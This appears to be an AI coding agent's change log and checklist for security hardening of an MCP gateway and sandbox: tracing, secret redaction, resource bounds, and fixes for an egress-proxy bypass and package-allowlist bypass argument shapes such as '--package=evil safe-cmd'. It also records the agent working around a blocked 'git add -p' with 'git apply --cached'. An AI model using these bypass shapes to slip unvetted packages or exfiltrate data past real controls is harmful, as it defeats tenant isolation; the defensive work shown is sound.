      MCPEvent + the broker adapter hop on org_mcp_jsonrpc + bare REST, but internal_tools_call + internal_discover_tools
      recorded ALL audit events with NO request_id and called _adapter_forward with NO correlation_id -> a chat tool
      call / tool-sync trace ENDED at the internal boundary. FIX (mcp_proxy.py): both routes compute
      _mcp_request_correlation_id(request,1) once at entry + thread request_id into ALL _record_gateway_event calls
      (incl. the _scan_internal_result closure + _scan_internal_tools_list helper which gained a request_id param) +
      pass correlation_id to _adapter_forward (propagates to broker via broker_send_rpc CHG-0051 -> broker log CHG-0052).
      Trace now continuous gateway->broker->sandbox on the chat path. NEW TEST test_mcp_internal_correlation_id.py (3) +
      fixed a CHG-0109 test mock signature. Gate: 3 + 1756 gateway passed 0 failed; broker 155. Oracle N/A (tracing).
      Evidence mcp-parallel/findings/backstop-p-internal-correlation-id/finding.md.
      CHG-0121 (2026-07-03, LOW tracing completeness — LAST hop, closes the CHG-0052 residual): broker did not forward
      X-Request-ID to the sandbox AGENT + the agent didn't log it. CHG-0051/0052 propagate + log the id at the broker,
      CHG-0120 threads it gateway->adapter, but _post_agent_rpc was called with NO request_id + did client.post(json=
      payload) with NO headers -> the id never reached the in-container agent, whose /rpc neither read nor logged it.
      Trace broke at broker->agent. FIX: (1) services/mcp-broker/src/sandbox/routes.py: _forward_sandbox_rpc passes
      request_id to _post_agent_rpc, which forwards it as an X-Request-ID header (omitted when absent); (2)
      sandbox-image/agent/main.py: /rpc reads X-Request-ID (Header) + logs ONE line with SAFE metadata ONLY (org/server/
      transport/method/jsonrpc_id/request_id, NEVER params/args/env/upstream, mirrors CHG-0052). Trace now continuous
      gateway->broker->sandbox agent. +2 broker tests + 1 agent test. Gate: 5 ready-retry + 157 broker + 7 agent passed;
      gateway unaffected. Oracle N/A (tracing). Completes CHG-0050/0051/0052/0120. Item-13 tracing residual now ONLY
      OTEL/Jaeger + PG/Redis backup (INFRA/host-blocked). Evidence mcp-parallel/findings/backstop-p-agent-correlation-id/finding.md.
      CHG-0122 (2026-07-03, MEDIUM 1.4 leak): finite SSE branch didn't scan interleaved server-pushed notifications. The
      ext-proxy FINITE SSE branch (tools/call/resources/*/prompts/*, buffered CHG-0039/0064) called
      _scan_reframe_sse_tool_result with the default scan_notifications=False -> a finite call's SSE can INTERLEAVE
      server-pushed notification frames (notifications/progress, notifications/message) BEFORE the result, re-emitted
      VERBATIM (only result/error events scanned). A secret/PII in a mid-call notification egressed raw, while the
      NON-finite stream (CHG-0098) already scans notification params. Byte-verified: notifications/message with
      AKIAIOSFODNN7EXAMPLE + bob@corp.example interleaved before a benign tools/call result egressed both raw. FIX
      (mcp_proxy.py): finite branch now passes scan_notifications=True -> interleaved notification params scanned
      (masked/fail-closed) via the result floor; result frame still delivered. +1 test. Gate: 12 sse + 1777 gateway
      passed 0 failed; broker unaffected. Oracle (aidefence): has_pii true raw / false masked. Parity with CHG-0098;
      extends CHG-0039/0064. Evidence mcp-parallel/findings/backstop-p-finite-sse-notification-scan/finding.md.

## G5 — VERY HARD stress (big hardware; run each, capture evidence)
- [ ] 14. 30–50 orgs × 8–10 MCPs = 300–500 sandboxes concurrently — provision + healthy.
      CODE CEILING REMOVED — CHG-0010 (2026-07-02): scale provisioner org count was a hardcoded 3-tuple
      (→ 3×5=15-sandbox ceiling). Now build_orgs(NUM_ORGS) (default 3 backward-compat; extends via org-<i>),
      so NUM_ORGS=50 SERVERS_PER_ORG=10 → 500 targets. New scripts/test_mcp_scale_provision.py: 4 pass
      (incl. 50-org→500-sandbox). REMAINING before [x]: (1) PRE-CREATE the N orgs in control (bulk
      org-creation mgmt command using org-<i> convention — provisioner logs in, doesn't create); (2) broker
      per-org DISTINCT sandbox UID for a true per-tenant fork budget (NPROC_ROOT_CAUSE.md — shared host-UID
      budget saturated ~244/256 at just 15 servers); (3) actually provision + prove 300-500 sandboxes
      HEALTHY concurrently on the live stack.
- [ ] 15. 5k–10k concurrent tool calls — routing correct, isolation holds, none dropped/mixed.
- [ ] 16. Soak (hours) — no leaks/exhaustion/503 storms; reaper correct.
- [ ] 17. Resource bombs (mem/fork/disk/timeout) — contained; neighbors + host safe.
- [ ] 18. Chaos (kill sandbox/broker/Redis/PG) — auto-recovery + no leakage during recovery.
- [ ] 19. Cross-tenant leakage canaries at 500-sandbox scale under chaos — never observed anywhere.
      ORACLE FIXED — CHG-0009 (2026-07-02): the audit-log cross-tenant oracle in mcp_scale_matrix_live.py
      was FABRICATED (`for fs in []` → foreign_org_events structurally 0, and NOT in the PASS gate — a
      false "isolation proven" signal). Replaced with a real unit-tested count_foreign_events, ADDED to the
      PASS gate (total_foreign==0), made the module import-safe, renamed misleading total_egress_bytes→
      request_payload_bytes. New scripts/test_mcp_scale_oracle.py: 5 pass (incl. proof the OLD predicate
      missed a real leak). REMAINING before [x]: run the canary matrix LIVE at 500-sandbox scale under
      chaos with the corrected+gated oracle + capture REAL sandbox egress bytes cross-checked with an
      independent aidefence oracle (tied to item 14 true scale — still a hardcoded-3-org=15-sandbox ceiling).
      LIVE VERIFIED @15-MCP — CHG-0013 (2026-07-02): stack was up, RAN scale-matrix 3× consecutive
      (ROUNDS=6, 540 calls): cross_org_result_leak=0, foreign_org_events_total=0 (fixed oracle), errors=0,
      mismatches=0 → cross-tenant isolation HOLDS. De-flaked the gate: retry-on-mismatch (+transient_retries)
      since a ~0.7% transient echo hiccup under load intermittently failed the strict gate (NOT a demux/
      isolation bug — cross_org_leak/errors stayed 0 across 1080+ calls). Evidence:
      mcp-parallel/findings/backstop-p19-isolation/scale_isolation_evidence.json. REMAINING before [x]:
      run at TRUE 300-500-sandbox scale (item 14 live) UNDER CHAOS (item 18) with captured egress bytes +
      independent aidefence cross-check.
- [ ] 20. 1.4 under peak load — redaction + per-actor authz + tagging hold; no PII/IP/regulated escape.
      HARNESS UPGRADED — CHG-0012 (2026-07-02): mcp_live_matrix_harness.py was fully SEQUENTIAL (not peak
      load) + classified only allowed/blocked/errors, never inspecting response bytes (a redact-but-forward
      counted as allowed). Now runs all calls CONCURRENTLY (CONCURRENCY-bounded semaphore, asyncio.gather)
      + asserts on RESPONSE BYTES via find_leaked_values (any sent sensitive value appearing raw in the
      egress = LEAK → run FAILS). New scripts/test_mcp_live_matrix_oracle.py: 5 pass. REMAINING before [x]:
      run LIVE at peak load (high CONCURRENCY / 5k-10k in-flight, tied to item 15) against the stack, prove
      ZERO leaks 3× consecutively; extend with per-actor authz-denial + tag-enforcement cases under load.
      LIVE VERIFIED @25-concurrency — CHG-0014 (2026-07-02): ran the upgraded live-matrix harness 3×
      consecutive (CONCURRENCY=25, 150 calls each/450 total): total_leaked=0, total_redacted=60/run,
      errors=0 → 1.4 redaction HOLDS under concurrent load (validates CHG-0003/0004/0005 result floor +
      CHG-0012 byte-check end-to-end; the outbound floor redacts PII even under the default tag posture).
      Harness fixes: PII embedded in `message` (round-trips through the echo test tool — the redaction test
      was vacuous before); resilient server-id lookup (graceful CONTROL_URL degradation). Evidence:
      mcp-parallel/findings/backstop-p20-redaction-load/redaction_under_load_evidence.json. REMAINING before
      [x]: run at TRUE peak (5k-10k in-flight, item 15); add per-actor authz-denial + tag-enforcement cases.
      CHG-0028 (2026-07-02): authz-denial dimension ADDED to the harness. New authz_denied() (403 / authz-error
      / [BLOCKED] result; a GENERIC error is NOT a denial) + authz_violation() (True ONLY when a forbidden tool
      EXECUTED successfully under load = a real hole) + a Scenario type + a DENY_TOOL_NAME-gated F_authz_deny
      concurrent agent; the gate now FAILS on any authz violation and flags a vacuous deny run. +3 oracle tests
      (scripts/test_mcp_live_matrix_oracle.py -> 8 passed); build_scenarios() = 5 default / 6 with DENY_TOOL_
      NAME. Backward-compat: unset -> redaction matrix unchanged. STILL OPEN (item stays [ ]): (a) run the full
      matrix LIVE at TRUE peak (5k-10k, item 15) with a real denied-but-existing tool as DENY_TOOL_NAME (needs
      a dedicated host + a per-key allowlist/disabled-tool setup, not safe to configure unilaterally on shared
      state); (b) tag-enforcement-under-load audit = query MCPEvents for compliance_tags at load (per CHG-0017).
      CHG-0029 (2026-07-02): hardened the OTHER named harness — mcp_pipeline_matrix_live.py. It was leak-blind
      (pii = _SSN in text: ONE hardcoded SSN in ONLY result.content[0].text, so a redact-but-forward in a later
      content item / structuredContent / nested field / any non-SSN value passed as redacted — false-green
      under load) and import-unsafe (KEY/argv/asyncio.run at module scope). Now find_pii_in_body() scans the
      FULL serialized response for the case's ACTUAL sensitive values (case_sensitive_values: explicit
      case['pii'] or SSN fallback); redacted = allow + no raw value anywhere + a marker (byte-truth);
      import-safe. +8 unit tests (scripts/test_mcp_pipeline_oracle.py); all 4 scripts oracle suites -> 25
      passed. Same class of fix as CHG-0009 (dead oracle) + CHG-0012 (no byte-check). The LIVE pipeline run at
      scale (epochs × cases × REPEAT) still needs the dedicated-host stress env (items 14-18); this makes its
      verdicts trustworthy.

## G6 — Frontend (strictly; log edits to owned panels)
- [ ] 21. MCP panels reflect 1.4 (tags, per-actor tool controls, redaction indicators), real data, no leak, both themes.
      CHG-0019 (2026-07-02): fixed the mojibake sub-finding — PolicyManagementPanel.jsx:399 Actor Scope
      header had literal `·` in raw JSX text (a fe-harden mojibake "fix" that was itself broken — JSX
      doesn't interpret escapes in text nodes, so it rendered the literal string). Now `{'·'}` (JS expr
      → renders `·`, pure-ASCII source). npm run build ✓. REMAINING (owned by fe-harden): explicit redact
      signal from tools/call + Redact badge + redacted-field list on execute; fix Redact StatCard
      under-count; extend Playwright gate to cover tags/actor/redaction; both themes.
      CHG-0036 (2026-07-02, FINDING): item 21 is NOT met for the TAG dimension (corrects fe-harden's simulator
      "item 11 DONE"). MCPGuardrailSimulator.jsx builds its verdict without compliance_tags and renders no tag
      chip; the LIVE 2xx branch is nearly blank (no redaction indicator / tags) for a call the gateway
      redacted. ROOT CAUSE is BACKEND: PolicyTestView (/api/policies/test/) imports get_compliance_tags but
      omits compliance_tags from the response payload, and /api/mcp-connector/tools/call/ keeps tags only in
      the MCPEvent audit — the UI can't reflect what the backend never sends. FIX (owners): control adds
      compliance_tags to those responses (unifying vocab per item 5) + frontend renders a tag chip list +
      enriches the live branch (Playwright gate). NOT safely gate-able from this session: no control venv/test
      DB (DO NOT FAKE GREEN), no dev server for Playwright, fe-harden owns the panel. Evidence:
      mcp-parallel/findings/backstop-p21-frontend-tag-reflection/finding.md.

## G7 — Recursive verification
- [ ] 22. Re-run G2–G6 end-to-end 3×; adversarial pass; Ruflo consensus green. Only then <promise>COMPLETE</promise>.
      CHG-0037 (2026-07-02): wrote the completion-readiness matrix docs/mcp/COMPLETION_READINESS.md — every 1.4
      + architecture + stress requirement mapped to CODE-HARDENED / VERIFIED / OPEN(blocker) with CHG evidence.
      Code-level G2/G3/G4 hardening is comprehensive + gated green (gateway suite 1081 passed; broker 52;
      scripts oracle 25). The G5 stress suite (items 14-19) is the completion gate and is ENTIRELY OPEN,
      blocked on a DEDICATED non-shared host (300-500 sandboxes / 5k-10k calls / soak / bombs / chaos are
      destructive or exceed the shared host's fork budget). The 3×-consecutive stress pass has NOT run at that
      magnitude → item 22 NOT satisfiable from this shared-stack backstop session; the <promise> stays
      unspoken. Remaining non-stress gaps are infra (gVisor/egress/OTEL/backup/npm-prod) or owned/cross-plane
      (item-21 UI tags via control response, item-5 vocab).

---
## CHG-0123 (2026-07-03) — internal streamable-http SSE branch: per-EVENT reassembly (correctness/robustness parity)

- **Item:** the last SSE surface still using a naive per-LINE split (org SSE=CHG-0093, ext finite SSE=CHG-0122 already reassemble per-event). LOW severity — correctness/robustness, NOT a new leak.
- **Root gap:** `internal_tools_call` legacy streamable-http SSE branch (reached only with `MCP_HTTP_VIA_SANDBOX=0`; streamable-http is sandbox-routed by default) parsed the SSE per LINE and returned the FIRST parseable `data:` line via `_scan_internal_result`. (a) a server-pushed NOTIFICATION before the result was returned as the response (WRONG frame; tool result lost); (b) a multi-line-`data:` result failed `json.loads` per partial line → dropped → "Empty SSE response". Byte-probed both pre-fix.
- **Fix (mcp_proxy.py ~L2977):** parse PER EVENT (`split("\n\n")`), reassemble each event's `data:` fields joined by `"\n"` (SSE spec), prefer the result/error event, skip notifications → the chosen result/error is floor-scanned by `_scan_internal_result`; a notification is never returned to the chat pipeline. Not a new leak (returned frame still floor-scanned; split secret fails safe to empty).
- **Gate:** `test_mcp_internal_http_result_scan.py` → 8 passed (3 new). Staged blob (HEAD + only this hunk, no CLEANUP-06) py_compiles. The 2 `test_mcp_bare_proxy_scan` ssrf failures in a full run are the mcp-page session's IN-FLIGHT CLEANUP-06 (pass on clean HEAD; independent — `ext_mcp_proxy`).
- **SHARED-WORKTREE (KEY):** the mcp-page session (MCP-PAGE-CLEANUP-06) had DEFERRED its mcp_proxy.py+tests commit because `git add -p` is blocked and my SSE hunk was intermixed (their own AGENTS.md note). Solved with `git apply --cached` of the isolated CHG-0123 hunk → committed ONLY my hunk; their CLEANUP-06 SSRF hunks + test edits stay uncommitted in the working tree (neither committed nor destroyed). This UN-BLOCKS their deferred commit — the file "settles".
- **Evidence:** `mcp-parallel/findings/backstop-p-internal-sse-event-reassembly/finding.md`. Parity: org CHG-0093, ext CHG-0122. Promise still WITHHELD (G5 stress items 14-19 host-blocked; item-21 UI owned cross-plane).

---
## CHG-0124 (2026-07-03) — chat-path disabled-tool authz regression-lock (rigorous-verification of actor-keyed authz)

- **Item:** HARDEN 1.4 per-user/agent/role tool authorization — rigorous re-verification of the chat-pipeline surface + lock in the invariant. Test-only, no code change.
- **Verified sound:** direct-MCP path enforces per-API-key mcp_allowed_tools (_tool_allowed_by_key L3743/L4506) + tools/list visibility filter + cap; chat path (internal_tools_call L2658, called by control MCPToolCallView -> /v1/mcp/internal/tools-call, views.py L834) has NO end-user API key so per-key allowlist doesn't apply BY DESIGN — instead it blocks the org-DISABLED set (_is_tool_disabled -> -32000 L2701) BEFORE any forward + runs full 1.4 chain (inbound scan/block, outbound scan/redact, tag, audit). Read handler + control caller payload (no actor allowlist) -> NO live bypass.
- **Gap closed:** disabled-block was only UNIT-covered (test_mcp_enabled_tools_cache). Added e2e proof that internal_tools_call short-circuits EXECUTION for a disabled tool — never forwards on sandbox (_adapter_forward) OR legacy httpx -> no egress. Guards the invariant against the many parallel sessions editing mcp_proxy.py.
- **Gate:** test_mcp_internal_http_result_scan.py -> 10 passed; full gateway suite 1787 passed 0 failed.
- **Evidence:** mcp-parallel/findings/backstop-p-chat-path-disabled-tool-authz-lock/finding.md. Promise WITHHELD (G5 stress items 14-19 host-blocked; item-21 UI cross-plane).

---
## CHG-0125 (2026-07-03) — egress-lockdown bypass: sandbox proxy env was uppercase-only (item 12 egress dimension)

- **Gap:** `_egress_proxy_env` (services/mcp-broker/src/sandbox/docker_manager.py) injected only UPPERCASE HTTP_PROXY/HTTPS_PROXY/NO_PROXY. curl uses ONLY lowercase http_proxy for plain HTTP (httpoxy/CVE-2016-5385); wget/git prefer lowercase. -> a sandboxed MCP server shelling to curl/wget/git BYPASSED the egress proxy -> direct exfil to arbitrary hosts over the org bridge NAT even under MCP_SANDBOX_EGRESS_LOCKDOWN=true. Found while surveying container hardening (items 10/12): resource/security kwargs (mem/memswap/nano_cpus/pids/read_only/cap_drop ALL/no-new-privileges/seccomp/tmpfs) are DONE + thoroughly regression-locked in test_sandbox_lifecycle.py; the egress proxy-env was the weak spot.
- **Fix:** emit BOTH cases; {}-when-disabled fast path preserved. `_egress_proxy_env` is the ONLY proxy-env source (grep-verified).
- **Gate:** broker test_sandbox_lifecycle.py -k "egress or proxy" 2 passed; full broker -k "not websocket" 158 passed.
- **Honesty:** closes the SOFT env bypass for proxy-respecting tools; a HARD network lockdown (internal net + forced/transparent proxy or iptables egress) remains INFRA (unchanged); egress-lockdown OFF by default. Evidence mcp-parallel/findings/backstop-p-egress-proxy-lowercase-bypass/finding.md. Promise WITHHELD (G5 stress items 14-19 host-blocked).

---
## CHG-0126 (2026-07-03) — stdio package allowlist/pinning bypass (=-form + 2nd flag), BOTH adapters (item 8 supply-chain)

- **Gap:** stdio_manager.py (sandbox agent) AND mcp_stdio_adapter.py (gateway host) extracted the npx/uvx package with a single-spec, SPACE-only parser. (1) `--package=evil safe-cmd` (=-form) skipped as a flag → allowlist/pinned check ran on the trailing COMMAND token while npx fetched evil; (2) `-p allowed -p evil cmd` → only first checked → unlisted/unpinned pkg runs in the sandbox AND on the shared gateway host ("no unknown npm on host"). Found by tracing the CHG-0022 package-gating and testing arg shapes.
- **Fix:** `_extract_package_specs` (plural) handles `--flag value` + `--flag=value` for --from/--with/--package/-p + multiple flags; bare positional taken as package ONLY when no package flag supplied one (else it's the command npx runs). Enforcement loops over EVERY spec; thin `_extract_package_spec` wrapper preserves the helper API. Applied to BOTH adapters for parity.
- **Gate:** agent test_stdio_manager_packages 41 passed / full agent suite 75 passed; gateway test_mcp_stdio_adapter_package_gating 7 passed / full gateway 1794 passed 0 failed.
- **Evidence:** mcp-parallel/findings/backstop-p-stdio-package-allowlist-bypass/finding.md. Controls OFF by default (opt-in). Promise WITHHELD (G5 stress items 14-19 host-blocked).

---
## CHG-0127 (2026-07-03) — reaper TOCTOU: idle sandbox reactivated mid-sweep was still reaped (item 10/16 reaper correctness)

- **Gap:** reap_idle_sandboxes (services/mcp-broker/src/sandbox/reaper.py) snapshotted idle_entries once, then stopped entries one-by-one with `await asyncio.to_thread(docker_manager.stop, ...)`. Each await yields; a concurrent request via _forward_sandbox_rpc touch_activity->registry.touch reactivates a sandbox mid-sweep, but the reaper stopped it on the STALE snapshot + removed it -> in-flight call forwarded to a stopping container -> dropped call + re-provision. Real intermittent failure under soak/peak concurrency (stress items 15/16/18).
- **Fix:** new locked SandboxRegistry.is_idle(org, idle_timeout, now=None); reaper RE-CHECKS is_idle right before stopping each entry, SKIPS any reactivated since the snapshot (now=None reads a fresh clock so a post-snapshot touch is seen). Collapses the race window from whole-sweep to a single stop.
- **Gate:** broker test_sandbox_reaper.py 12 passed (test_reaper_skips_sandbox_reactivated_mid_sweep drives the real race + is_idle unit); full broker -k "not websocket" 160 passed.
- **Honesty:** residual micro-window between the re-check and the stop call remains (rarer; would need a reaping-state flag + re-provision-on-conflict). Evidence mcp-parallel/findings/backstop-p-reaper-toctou-reactivated-sandbox/finding.md. Promise WITHHELD (G5 live stress items 14-19 host-blocked).

---
## CHG-0128 (2026-07-03) — in-sandbox SSE reader: bound per-event data accumulation (resource-bomb containment, item 17)

- **Gap:** _sse_reader_loop (services/mcp-broker/sandbox-image/agent/sse_manager.py) — the untrusted-upstream GET /sse reader — accumulated every data: line into data_lines with NO cap, joined on the blank line. An upstream streaming unbounded data: lines WITHOUT a blank line grows data_lines until the agent OOMs (mem_limit) -> crashes the sandbox -> drops ALL the org's servers. Siblings already bounded: CHG-0066 (streamable-http per-response), CHG-0117 (gateway ext-SSE stream), WS per-message.
- **Fix:** track data_bytes; over _MAX_RESPONSE_BYTES (8MB, MCP_AGENT_MAX_RESPONSE_BYTES) DROP the oversized event (skipping flag discards to the next blank line) then resume normally. Legit events incl. multi-line-under-cap unchanged; reader survives.
- **Gate:** test_sse_reader_bounds.py (new) 3 passed; test_upstream_proxy.py 18 passed (SSE path unbroken); full agent suite green.
- **Residuals (honest, deferred):** (1) a single huge unterminated line still buffers inside httpx aiter_lines (needs an aiter_bytes bounded line-splitter); (2) the sse_responses asyncio.Queue is unbounded (needs drop/backpressure semantics). Evidence mcp-parallel/findings/backstop-p-agent-sse-reader-unbounded-event/finding.md. Promise WITHHELD (G5 stress items 14-19 host-blocked).

---
## CHG-0129 (2026-07-03) — in-sandbox SSE response queue bounded (closes CHG-0128 residual #2, item 17)

- **Gap:** session.sse_responses (services/mcp-broker/sandbox-image/agent/sse_manager.py) was an UNBOUNDED asyncio.Queue(). The reader is a persistent bg task that put()s every upstream message-event; the consumer (send_sse_jsonrpc) only drains WHILE an RPC is in flight (id-matched). An untrusted upstream flooding UNSOLICITED message events while no RPC is active grows the queue unbounded -> agent OOM -> drops ALL the org's servers. Residual #2 documented in CHG-0128.
- **Fix:** _new_sse_queue() with maxsize=_SSE_QUEUE_MAXSIZE (default 1024, floor 16, env MCP_AGENT_SSE_QUEUE_MAXSIZE); _bounded_put replaces the producer await put() — put_nowait, on QueueFull evict oldest then put (atomic, keeps freshest, NEVER blocks the reader). A waiting consumer get() receives the item directly (never counts vs maxsize) so normal RPC delivery is unchanged.
- **Gate:** test_sse_reader_bounds.py 5 passed (3 CHG-0128 + 2 new); test_upstream_proxy.py SSE RPC path unbroken; full agent suite green.
- **Residual STILL open:** single huge unterminated line via httpx aiter_lines (needs aiter_bytes bounded line-splitter). Evidence mcp-parallel/findings/backstop-p-agent-sse-response-queue-unbounded/finding.md. Promise WITHHELD (G5 stress items 14-19 host-blocked).

---
## CHG-0130 (2026-07-03) — SSE readers: bound the single unterminated line (closes CHG-0128/0129 residual #1, item 17)

- **Gap:** both agent SSE read paths — sse_manager._sse_reader_loop (legacy HTTP+SSE) AND upstream_manager._post_streamable_http (streamable-http SSE branch) — iterated response.aiter_lines(), which buffers ONE line unbounded (httpx LineDecoder, no size cap). An untrusted upstream sending one enormous line with NO newline OOMs the agent INSIDE aiter_lines, BEFORE the line is yielded — so the CHG-0128 per-event cap + CHG-0129 queue bound (both act after a line is yielded) can't help. This is residual #1 from CHG-0128/0129.
- **Fix:** shared _aiter_sse_lines_bounded(response, max_line_bytes) in upstream_manager reads raw bytes via aiter_bytes(), splits on \n (strips trailing \r), yields lines, and RAISES UpstreamError "upstream SSE line too large" once an UNTERMINATED buffer would exceed _MAX_RESPONSE_BYTES (8MB) -> buffer bounded to ~one line's cap. Both paths use it (reader task ends -> next RPC restarts; streamable-http surfaces the error). Well-formed single/multi-line events parse as before.
- **Gate:** test_sse_reader_bounds.py 6 passed (new huge-line test); test_upstream_proxy.py 18 passed (both SSE paths green with fakes migrated to aiter_bytes); full agent suite green.
- **Triad complete:** CHG-0128 (per-event data) + CHG-0129 (response queue) + CHG-0130 (per-line) = the untrusted-SSE buffering surface is now bounded. Evidence mcp-parallel/findings/backstop-p-agent-sse-unbounded-line/finding.md. Promise WITHHELD (G5 stress items 14-19 host-blocked).
